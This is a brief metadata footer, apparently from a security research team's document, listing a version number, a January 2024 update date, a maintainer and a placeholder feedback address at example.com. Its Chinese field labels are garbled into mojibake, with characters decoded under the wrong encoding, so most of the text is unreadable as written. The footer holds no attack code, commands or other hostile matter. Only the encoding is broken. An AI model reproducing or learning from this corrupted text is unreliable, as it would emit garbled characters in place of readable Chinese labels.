---

**æ–‡æ¡£ç‰ˆæœ¬**: v2.0
**æœ€åæ›´æ–°**: 2024å¹´1æœˆ
**ç»´æŠ¤è€…**: Security Research Team
**åé¦ˆé‚®ç®±**: security@example.com (è¯·æ›¿æ¢ä¸ºå®é™…é‚®ç®±)
